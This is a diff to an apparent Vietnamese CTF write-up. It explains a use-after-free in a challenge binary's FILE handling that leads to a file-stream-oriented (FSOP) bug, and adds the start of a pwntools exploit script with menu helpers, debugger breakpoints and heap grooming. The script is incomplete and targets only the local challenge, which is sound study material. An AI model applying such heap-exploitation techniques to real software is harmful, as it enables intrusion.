@@ -260,6 +260,8 @@ void open_file(void)
   return;
 }
 ```
+* tạo một cấu trúc `FILE` trên heap với tổng chunksize là `1e0`
+
 `close_file()`:
 ```c
 void close_file(void)
@@ -282,6 +284,10 @@ void close_file(void)
   return;
 }
 ```
+* Giải phóng chunk của `FILE` vào tcachebins
+* Nhưng, `fp` không được NULL. Thành ra `fp` vấn trỏ đến phần freed chunk của `FILE`
+* Phần data trong freed chunk được mã hóa với XOR 
+
 `write_file()`:
 ```c
 void write_file(void)
@@ -312,6 +318,9 @@ void write_file(void)
   return;
 }
 ```
+* Sau khi giải phóng với `close_file`, chọn `write_file` sẽ gọi đến fwrite() với luồng fp vẫn còn đấy
+
+  ==> FSOP bug
 
 ___
 ### Exploit:
@@ -320,7 +329,93 @@ ___
 ___
 `script.py`:
 ```python
+from pwn import *
 
+context.arch = 'amd64'
+
+libc = ELF("./libc.so.6", checksec=False)
+context.binary = exe = ELF("./chall_patched", checksec=False)
+context.log_level = "debug"
+
+def GDB():
+	gdb.attach(p, gdbscript='''
+		#create
+		#br *($rebase(0x16c1))
+		br *($rebase(0x175f))
+		#view
+		br *($rebase(0x154f))
+		#edit
+		br *($rebase(0x1631))
+		#remove
+		br *($rebase(0x17de))
+		br *($rebase(0x18df))
+		#openfile
+		br *($rebase(0x1286))
+		#closefile
+		br *($rebase(0x12a0))	
+		br *($rebase(0x1340))	
+		#writefile
+		br *($rebase(0x137b))
+		br *($rebase(0x144a))
+		''')
+
+p = process(exe.path)
+GDB()
+
+
+def create(size):
+	p.sendlineafter(b"> ", b"1")
+	p.sendlineafter(b"choncc:", str(size))
+
+def view(idx):
+	p.sendlineafter(b"> ", b"2")
+	p.sendlineafter(b"number:", str(idx))
+
+
+def edit(idx, data):
+	p.sendlineafter(b"> ", b"3")
+	p.sendlineafter(b"number:", str(idx))
+	p.sendlineafter(b"choncc:", str(data))
+
+def remove(idx):
+	p.sendlineafter(b"> ", b"4")
+	p.sendlineafter(b"number:", str(idx))
+
+def open_file():
+	p.sendlineafter(b"> ", b"5")
+
+def close_file():
+	p.sendlineafter(b"> ", b"6")
+
+def write_file(choice, data):
+	p.sendlineafter(b"> ", b"7")
+	p.sendlineafter(b"[Y/n]", choice)
+	if choice == b'y':
+		p.send(payload)
+
+
+#############
+open_file()
+
+create(0x20)
+create(0x20)
+create(0x20)
+create(0x20)
+create(0x20)
+create(0x20)
+create(0x20)
+create(0x20)
+
+remove(1)
+remove(2)
+remove(3)
+remove(4)
+remove(5)
+remove(6)
+remove(7)
+remove(8)
+
+p.interactive()
 ```
 
 
